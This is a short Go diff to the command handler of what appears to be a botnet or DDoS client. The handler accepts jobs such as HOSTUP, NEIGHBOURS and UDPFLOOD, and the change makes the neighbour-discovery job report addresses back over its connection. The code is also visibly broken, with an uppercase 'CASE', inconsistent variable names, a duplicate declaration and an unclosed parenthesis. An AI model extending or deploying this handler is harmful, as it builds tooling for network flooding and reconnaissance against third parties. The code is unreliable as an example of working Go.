@@ -70,7 +70,7 @@ func Seeker() {
 				fallthrough
 			case "JOB HOSTUP":
 				fallthrough
-			case "JOB NEIGHBOURS 1":
+			case "JOB NEIGHBOURS 5":
 				fallthrough
 			case "JOB UDPFLOOD":
 				conn.Write([]byte(fmt.Sprint("ACPT JOB ", queryStr[4:], " \r\n")))
@@ -135,9 +135,11 @@ func Seeker() {
 					break
 				}
 				break
-			CASE "JOB NEIGHBOURS 1":
+			CASE "JOB NEIGHBOURS 5":
+				splits := strings.Split(cleanedResult[:15], cleanedResults[:2])
 				var addresses []map[string][]byte
-				addresses := jobs.neighbours();
+				addresses := jobs.neighbours(splits[1]);
+				conn.Write([]byte(fmt.Sprint(addresses, ", "))
 				
 				break
 			case "JOB UDPFLOOD":
